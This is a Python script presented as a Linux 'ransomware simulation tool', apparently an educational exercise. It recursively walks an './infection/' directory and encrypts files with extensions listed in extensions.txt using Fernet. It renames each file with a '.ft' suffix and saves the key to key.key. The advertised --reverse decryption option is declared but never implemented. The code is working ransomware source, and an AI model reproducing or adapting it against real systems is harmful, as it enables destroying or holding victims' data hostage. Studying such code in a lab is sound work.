import argparse
import os
import sys

from cryptography.fernet import Fernet


def check_extension(file_name):
    try:
        with open("extensions.txt", "r") as file:
            file_data = file.read()
    except FileNotFoundError:
        print("File 'extensions.txt' not found.")
        sys.exit(1)
    extensions = file_data.splitlines()
    if any(file_name.endswith(ext) for ext in extensions):
        return True
    else:
        return False


def encrypt_file(file_name, key, silent):
    """
    Encrypt a file given a key.
    """
    if check_extension(file_name):
        f = Fernet(key)
        try:
            with open(file_name, "rb") as file:
                file_data = file.read()
        except FileNotFoundError:
            print("Error: file '{file_name}' not found.")
            sys.exit(1)
        encrypted_data = f.encrypt(file_data)
        try:
            if file_name.endswith('.ft'):
                new_file_name = file_name
            else:
                new_file_name = file_name + '.ft'
            os.rename(file_name, new_file_name)
            if silent == False:
                print(f"Encrypting... {file_name}")
            with open(new_file_name, "wb") as file:
                file.write(encrypted_data)
        except FileNotFoundError:
            print("Error: file '{file_name}' not found.")
            sys.exit(1)
    else:
        print(f"The file {file_name} does not have a matching extension.")



def generate_key():
    """
    Generate a key and save it into a file.
    """
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)
    return key

def list_dir(base_dir, key, silent):
    try:
        with os.scandir(base_dir) as entries:
            for entry in entries:
                if entry.is_dir():
                    list_dir(entry.path, key, silent)
                else:
                    if base_dir.endswith('/'):
                        file_name = base_dir + entry.name
                    else:
                        file_name = base_dir + '/' + entry.name
                    encrypt_file(file_name, key, silent)
    except FileNotFoundError:
        print(f"Directory not found: '{base_dir}'")
        sys.exit(1)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
    description='A ransomware simulation tool developed for the Linux platform.',
    )
    parser.add_argument(
            '-v', '--version',
            action='version',
            version='%(prog)s 1.0',
            help='Show the version of the program.'
    )
    parser.add_argument(
            '-r', '--reverse',
            metavar='KEY',
            type=str,
            help='Reverse the encryption process using the provided key.'
    )
    parser.add_argument(
            '-s', '--silent',
            action='store_true',
            help='Run the program in silent mode without displaying the names of the encrypted files.'
    )
    args = parser.parse_args()
    if args.silent:
        print("Silent mode.")
    base_dir = './infection/'
    key = generate_key()
    list_dir(base_dir, key, args.silent)
